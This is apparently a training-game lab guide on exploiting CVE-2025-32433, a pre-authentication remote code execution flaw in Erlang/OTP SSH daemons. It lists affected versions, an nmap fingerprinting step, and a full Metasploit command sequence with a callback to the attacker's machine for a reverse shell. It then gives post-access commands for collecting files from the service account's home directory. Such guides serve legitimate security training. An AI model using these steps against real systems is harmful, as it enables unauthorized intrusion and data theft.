---
title: SAFETYNET Field Guide - Erlang/OTP SSH RCE
layout: lab
description: Optional in-game guide for exploiting an Erlang/OTP SSH daemon for unauthenticated remote code execution
game_fragment: true
permalink: /labs/safetynet/erlang-otp-ssh-rce/
---

# SAFETYNET Field Guide: Erlang/OTP SSH RCE

## Objective

Use this guide when your scan of the training network turns up an SSH service on an unusual port, fingerprinted to the Erlang/OTP runtime rather than OpenSSH. The Erlang/OTP SSH library (CVE-2025-32433) mishandles protocol messages sent before authentication finishes, so an attacker who can reach the port can run commands with no credentials at all. That is your way onto the box, and command execution as the service account is enough to read what the account owns in its home directory.

## Quick Reference

- The service is an SSH daemon, but it is **not** OpenSSH. It is built on the Erlang/OTP `ssh` application, and it often listens on a **non-standard high port** rather than 22.
- The flaw is pre-authentication: the daemon processes certain SSH connection-protocol messages before the handshake has authenticated anyone. No username, no password, no key.
- Affected runtimes: Erlang/OTP before OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20.
- Metasploit module: `exploit/linux/ssh/ssh_erlangotp_rce`.
- You get command execution as the account the daemon runs under — usually an unprivileged service user. That is enough for the first flag; getting further is a separate step.

```bash
# Confirm the service and runtime from your scan
nmap -sV -p [ssh-port] [target-ip]

# Exploit with Metasploit
msfconsole
use exploit/linux/ssh/ssh_erlangotp_rce
set RHOSTS [target-ip]
set RPORT [ssh-port]
set LHOST [attacker-ip]
set LPORT [callback-port]
show options
exploit
```

Where:
- `[target-ip]` = the host running the vulnerable Erlang/OTP SSH daemon
- `[ssh-port]` = the non-standard port your scan found the service on
- `[attacker-ip]` = your own machine, for the payload callback
- `[callback-port]` = a free local port for the listener

## Detailed Procedures

### Step 1: Find and fingerprint the service

Scan the subnet and note every open port, not just 22. A service-version scan (`-sV`) is what tells an Erlang/OTP SSH daemon apart from a stock OpenSSH one — look at the banner and the reported software. A plain port scan will only tell you "something SSH-ish is here"; the version detail is what confirms you are looking at the vulnerable runtime.

If `-sV` is ambiguous, connect with a verbose SSH client (`ssh -vvv [target-ip] -p [ssh-port]`) and read the key-exchange and version strings it prints. An unusual implementation name in the handshake is the tell.

### Step 2: Confirm it is the vulnerable class

The bug is a design/logic flaw in message handling, not a memory-corruption exploit, so there is no crash to probe for. Confirmation comes from the version string plus the known-affected ranges above. If the runtime predates the patched OTP releases, treat it as exploitable and move to the module.

### Step 3: Land a shell

Point the Metasploit module at the host and port, set a payload with a callback (`LHOST`/`LPORT`) your target can actually reach, and run it. Because the flaw fires before authentication, you supply no credentials. On success you get a session running as the service account.

First commands after access:

```bash
id
hostname
# Look at what this account owns in its own home
ls -la ~
find /home/[service-user] -type f 2>/dev/null
```

## Common Patterns

- **Non-standard port.** Erlang/OTP SSH services are frequently stood up alongside a normal OpenSSH on 22, so the interesting daemon is the one on the odd high port. Scan the whole range.
- **Low-privilege landing.** You arrive as the daemon's own service user, not root. Files that user owns are readable now; anything in another user's home or a root-only path needs a separate escalation.
- **Home-directory loot.** What the service account was given to hold tends to live under its home directory. Read it rather than grabbing blindly.

## Troubleshooting

- **No session / no callback.** Recheck that the odd port is actually open from where you are, and that your `LHOST`/`LPORT` are reachable back from the target. A payload that cannot call home looks like a silent failure.
- **Module runs but nothing happens.** Confirm the runtime version really is in the affected range; a patched OTP will accept the connection and do nothing exploitable.
- **Shell is unstable.** Prefer a simple command/shell payload over a heavier session type; the Erlang SSH channel is narrow.
- **Can see the shell but cannot find the file.** You likely have the low-privilege service context. Search paths that user can read first (its own home); do not assume root-only locations.

## Mission Application

Where a mission puts an odd-port SSH daemon in front of you and the version does not look like OpenSSH, it is almost always the high-value foothold rather than noise — the route onto the box the rest of the mission turns on. The lighter services around it tend to hand over context: status pages, client details, transferred files. This daemon hands over a shell. Take it deliberately, read what the service account owns before you move, and submit the flag at the mission's terminal once you have it — that submission is what turns a foothold into a finding.

---

*Adapted from the SAFETYNET field-guide style guide and the SSH-it-happens training scenario.*
